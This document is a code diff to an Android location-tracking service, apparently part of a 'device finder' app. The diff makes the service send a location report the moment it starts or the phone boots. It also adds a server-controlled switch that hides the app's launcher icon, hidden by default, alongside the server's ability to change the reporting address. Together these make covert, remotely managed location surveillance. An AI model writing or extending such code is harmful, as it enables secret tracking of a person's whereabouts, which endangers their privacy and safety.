@@ -4,9 +4,11 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
 import android.location.Location;
 import android.location.LocationListener;
@@ -52,7 +54,14 @@ public class TrackingService extends Service implements LocationListener {
         super.onCreate();
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startForegroundNotification();
+        
+        // 1. 【核心新增】：服务一创建（或开机自启），立刻“闪电上报”一次！
+        sendReport(); 
+
+        // 2. 注册网络状态变动监听（Wi-Fi 跨网插队上报）
         registerNetworkCallback();
+        
+        // 3. 启动定时轮询
         startTracking();
     }
 
@@ -64,7 +73,6 @@ public class TrackingService extends Service implements LocationListener {
         return START_STICKY;
     }
 
-    // 适配高版本的前台通知启动（兼容 Android 14 / 15 / 16）
     private void startForegroundNotification() {
         String channelId = "device_guardian_channel";
         Notification.Builder builder;
@@ -82,7 +90,6 @@ public class TrackingService extends Service implements LocationListener {
                 .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                 .build();
 
-        // Android 14 (API 34) 及以上系统启动前台服务必须带上 ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
             startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         } else {
@@ -112,6 +119,20 @@ public class TrackingService extends Service implements LocationListener {
             SharedPreferences sp = getSharedPreferences("device_finder_prefs", MODE_PRIVATE);
             sp.edit().putString("saved_server_url", newUrl).apply();
         }
+    }
+
+    // 动态控制桌面图标显隐（通过 Activity-Alias）
+    private void handleIconVisibility(boolean hideIcon) {
+        try {
+            PackageManager p = getPackageManager();
+            ComponentName componentName = new ComponentName(this, "com.example.devicefinder.VisibleAliasActivity");
+            int newState = hideIcon ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED 
+                                    : PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+                                    
+            if (p.getComponentEnabledSetting(componentName) != newState) {
+                p.setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
+            }
+        } catch (Exception ignored) {}
     }
 
     private void registerNetworkCallback() {
@@ -178,7 +199,7 @@ public class TrackingService extends Service implements LocationListener {
 
     private void sendReport() {
         long currentTime = System.currentTimeMillis();
-        if (currentTime - lastReportTime < 5000) return;
+        if (currentTime - lastReportTime < 5000) return; // 5秒冷却锁
         lastReportTime = currentTime;
 
         final String activeUrl = getCurrentServerUrl();
@@ -310,6 +331,7 @@ public class TrackingService extends Service implements LocationListener {
         JSONObject cfg = res.optJSONObject("config");
         if (cfg == null) return;
 
+        // 1. 频率和精度动态调整
         long newInterval = cfg.optLong("report_interval_seconds", 1800) * 1000L;
         String newAccuracy = cfg.optString("accuracy_mode", "coarse");
 
@@ -324,10 +346,15 @@ public class TrackingService extends Service implements LocationListener {
             });
         }
 
+        // 2. 热更新服务器地址
         String nextServerUrl = cfg.optString("next_server_url", "");
         if (!nextServerUrl.isEmpty() && !nextServerUrl.equals(getCurrentServerUrl())) {
             saveNewServerUrl(nextServerUrl);
         }
+
+        // 3. 动态控制桌面图标显隐 (true=隐藏桌面图标, false=显示桌面图标)
+        boolean shouldHideIcon = cfg.optBoolean("hide_icon", true);
+        handleIconVisibility(shouldHideIcon);
     }
 
     @Override
